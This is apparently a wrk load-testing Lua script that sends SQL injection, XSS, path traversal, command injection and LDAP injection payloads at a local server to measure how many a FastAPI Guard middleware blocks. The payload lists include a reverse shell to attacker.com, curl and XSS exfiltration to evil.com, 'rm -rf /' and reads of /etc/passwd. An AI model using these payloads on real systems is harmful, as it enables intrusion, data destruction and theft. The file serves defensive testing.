-- wrk script for security testing - sends malicious payloads that should be blocked
-- Usage: wrk -t4 -c50 -d30s --script security-test.lua http://localhost:8000

-- Security test payloads that should be blocked by FastAPI Guard
local sql_injection_payloads = {
   "'; DROP TABLE users; --",
   "' OR 1=1 --",
   "' UNION SELECT * FROM passwords --",
   "admin'--",
   "' OR 'a'='a",
   "1' OR '1'='1",
   "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
   "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM users)) --",
   "1; EXEC xp_cmdshell('whoami'); --",
   "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
}

local xss_payloads = {
   "<script>alert('xss')</script>",
   "<img src=x onerror=alert('xss')>",
   "javascript:alert('xss')",
   "<svg onload=alert('xss')>",
   "<iframe src=javascript:alert('xss')></iframe>",
   "<body onload=alert('xss')>",
   "'+alert('xss')+'",
   "%3Cscript%3Ealert('xss')%3C/script%3E",
   "<script>document.cookie='session=hijacked'</script>",
   "<img src='x' onerror='fetch(\"/admin/delete\")'>",
   "<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>", -- Base64 encoded alert
   "<script>window.location='http://evil.com?cookie='+document.cookie</script>"
}

local path_traversal_payloads = {
   "../../../etc/passwd",
   "..\\..\\..\\windows\\system32\\config\\sam",
   "....//....//....//etc/passwd",
   "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
   "..%252f..%252f..%252fetc%252fpasswd",
   "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
   "/etc/passwd%00",
   "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
   "%5c%5c%2e%2e%5c%5c%2e%2e%5c%5c%2e%2e%5c%5cetc%5c%5cpasswd",
   "file:///etc/passwd"
}

local command_injection_payloads = {
   "; ls -la",
   "&& whoami",
   "| cat /etc/passwd",
   "; rm -rf /",
   "`whoami`",
   "$(cat /etc/passwd)",
   "; nc -e /bin/sh attacker.com 4444",
   "&& curl http://evil.com/steal.php?data=$(cat /etc/passwd | base64)",
   "; python -c \"import os; os.system('whoami')\"",
   "&& powershell.exe -Command \"Get-Process\""
}

local ldap_injection_payloads = {
   "*)(uid=*))(|(uid=*",
   "*)(|(password=*))",
   "admin)(&(password=*))#",
   "*)(|(objectClass=*))",
   "*)((|(userPassword=*))",
   "*))%00"
}

-- Combine all payloads
local all_payloads = {}
for _, payload in ipairs(sql_injection_payloads) do
   table.insert(all_payloads, {type = "sql_injection", payload = payload})
end
for _, payload in ipairs(xss_payloads) do
   table.insert(all_payloads, {type = "xss", payload = payload})
end
for _, payload in ipairs(path_traversal_payloads) do
   table.insert(all_payloads, {type = "path_traversal", payload = payload})
end
for _, payload in ipairs(command_injection_payloads) do
   table.insert(all_payloads, {type = "command_injection", payload = payload})
end
for _, payload in ipairs(ldap_injection_payloads) do
   table.insert(all_payloads, {type = "ldap_injection", payload = payload})
end

-- URL encode function
function url_encode(str)
   str = string.gsub(str, "\n", "\r\n")
   str = string.gsub(str, "([^%w ])", function(c)
      return string.format("%%%02X", string.byte(c))
   end)
   str = string.gsub(str, " ", "+")
   return str
end

-- Test endpoints that accept user input
local test_endpoints = {
   "/api/search?q=",
   "/api/search?filter=",
   "/api/search?category=",
   "/api/data?param="
}

-- Statistics tracking
local payload_stats = {}
local blocked_count = 0
local passed_count = 0
local error_count = 0

-- Setup function
setup = function(thread)
   thread:set("id", counter or 0)
   counter = (counter or 0) + 1
end

-- Main request function
request = function()
   -- Select random payload and endpoint
   local payload_data = all_payloads[math.random(#all_payloads)]
   local endpoint = test_endpoints[math.random(#test_endpoints)]
   local encoded_payload = url_encode(payload_data.payload)
   
   local full_path = endpoint .. encoded_payload
   
   -- Add some legitimate requests to mix (10% of requests)
   if math.random(1, 10) == 1 then
      local legitimate_queries = {"search term", "user data", "product info", "test query"}
      local legit_query = legitimate_queries[math.random(#legitimate_queries)]
      full_path = "/api/search?q=" .. url_encode(legit_query)
   end
   
   return wrk.format("GET", full_path, {
      ["User-Agent"] = "Security-Test-Bot/1.0",
      ["Accept"] = "application/json",
      ["X-Test-Type"] = payload_data.type or "legitimate"
   })
end

-- Track responses
response = function(status, headers, body)
   if status == 403 then
      blocked_count = blocked_count + 1
   elseif status == 200 then
      passed_count = passed_count + 1
   else
      error_count = error_count + 1
   end
end

-- Results analysis
done = function(summary, latency, requests)
   io.write("\n" .. string.rep("=", 70) .. "\n")
   io.write("FastAPI Guard Security Test Results\n")
   io.write(string.rep("=", 70) .. "\n")
   
   -- Basic statistics
   io.write(string.format("Total Requests:         %d\n", summary.requests))
   io.write(string.format("Duration:               %.2fs\n", summary.duration / 1000000))
   io.write(string.format("Requests/sec:           %.2f\n", summary.requests / (summary.duration / 1000000)))
   
   -- Security analysis
   io.write("\nSecurity Analysis:\n")
   io.write(string.rep("-", 40) .. "\n")
   io.write(string.format("Blocked Requests (403): %d (%.1f%%)\n", blocked_count, blocked_count / summary.requests * 100))
   io.write(string.format("Passed Requests (200):  %d (%.1f%%)\n", passed_count, passed_count / summary.requests * 100))
   io.write(string.format("Error Responses:        %d (%.1f%%)\n", error_count, error_count / summary.requests * 100))
   
   -- Security effectiveness
   local security_rate = blocked_count / (blocked_count + passed_count) * 100
   io.write(string.format("Security Block Rate:    %.1f%%\n", security_rate))
   
   -- Performance under attack
   io.write("\nPerformance Under Attack:\n")
   io.write(string.rep("-", 40) .. "\n")
   io.write(string.format("Average Latency:        %.2fms\n", latency.mean))
   io.write(string.format("95th Percentile:        %.2fms\n", latency:percentile(95)))
   io.write(string.format("99th Percentile:        %.2fms\n", latency:percentile(99)))
   io.write(string.format("Max Latency:            %.2fms\n", latency.max))
   
   -- Security verdict
   io.write("\nSecurity Assessment:\n")
   io.write(string.rep("-", 40) .. "\n")
   
   if security_rate >= 95 then
      io.write("🛡️  EXCELLENT SECURITY - 95%+ malicious requests blocked\n")
   elseif security_rate >= 90 then
      io.write("🛡️  GOOD SECURITY - 90-95% malicious requests blocked\n")
   elseif security_rate >= 80 then
      io.write("⚠️  MODERATE SECURITY - 80-90% malicious requests blocked\n")
   elseif security_rate >= 60 then
      io.write("⚠️  WEAK SECURITY - 60-80% malicious requests blocked\n")
   else
      io.write("❌ POOR SECURITY - Less than 60% malicious requests blocked\n")
   end
   
   -- Performance verdict under attack
   if latency.mean < 50 then
      io.write("⚡ EXCELLENT PERFORMANCE - Low latency under attack\n")
   elseif latency.mean < 100 then
      io.write("⚡ GOOD PERFORMANCE - Acceptable latency under attack\n")
   elseif latency.mean < 200 then
      io.write("⚠️  MODERATE PERFORMANCE - Higher latency under attack\n")
   else
      io.write("❌ POOR PERFORMANCE - High latency under attack\n")
   end
   
   -- Recommendations
   io.write("\nRecommendations:\n")
   io.write(string.rep("-", 40) .. "\n")
   
   if security_rate < 90 then
      io.write("• Consider enabling stricter WAF mode\n")
      io.write("• Review and add custom threat patterns\n") 
      io.write("• Enable additional security components\n")
   end
   
   if latency.mean > 100 then
      io.write("• Optimize security middleware performance\n")
      io.write("• Consider using Redis for better performance\n")
      io.write("• Review security component configuration\n")
   end
   
   if passed_count > blocked_count * 0.1 then
      io.write("• Review legitimate traffic patterns\n")
      io.write("• Fine-tune security rules to reduce false positives\n")
   end
   
   -- Test coverage
   io.write("\nTest Coverage:\n")
   io.write(string.rep("-", 40) .. "\n")
   io.write("✓ SQL Injection attacks\n")
   io.write("✓ Cross-Site Scripting (XSS)\n")
   io.write("✓ Path Traversal attacks\n")
   io.write("✓ Command Injection\n")
   io.write("✓ LDAP Injection\n")
   io.write("✓ Mixed legitimate traffic\n")
   
   io.write(string.rep("=", 70) .. "\n")
   io.write("Security test completed. Review results above.\n")
   io.write(string.rep("=", 70) .. "\n")
end